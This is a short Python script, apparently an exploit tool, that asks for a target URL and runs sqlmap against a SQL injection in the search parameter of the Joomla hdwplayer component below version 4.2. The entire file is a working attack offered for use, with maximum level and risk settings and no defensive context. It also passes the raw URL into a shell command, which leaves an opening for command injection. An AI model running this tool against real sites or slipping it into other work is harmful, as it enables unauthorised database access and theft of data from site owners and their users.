import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'

class Exploit(object):
	def __init__(self, url):
		self.url = url

	def sql_injection(self):
		sub.call(f'sqlmap -u "{self.url}" --method=POST --random-agent --data "option=com_hdwplayer&view=search&hdwplayersearch=xxx" --level=5 --risk=3 --dbms=mysql -p hdwplayersearch', shell=True)

if __name__ == '__main__':
	send = Exploit(url=input(f"{Colors.red}(Joomla hdwplayer <4.2 Search.php SQL Injection){Colors.end} [Enter Vulnerable URL]:~#"))
	send.sql_injection()
